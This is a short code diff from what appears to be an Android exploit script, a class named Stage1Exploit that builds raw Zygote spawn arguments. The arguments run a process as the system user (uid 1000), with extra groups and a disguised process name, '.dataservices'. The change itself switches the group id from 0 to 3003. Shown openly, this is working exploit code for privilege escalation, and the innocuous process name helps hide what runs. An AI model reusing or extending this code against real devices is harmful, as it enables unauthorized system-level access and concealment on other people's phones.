@@ -190,7 +190,7 @@ class Stage1Exploit:
         # TODO let you specify the SELinux context through command line arguments
         raw_zygote_arguments = [
             "--setuid=1000",
-            "--setgid=0",
+            "--setgid=3003",
             "--setgroups=1002",
             "--runtime-args",
             "--nice-name=.dataservices",
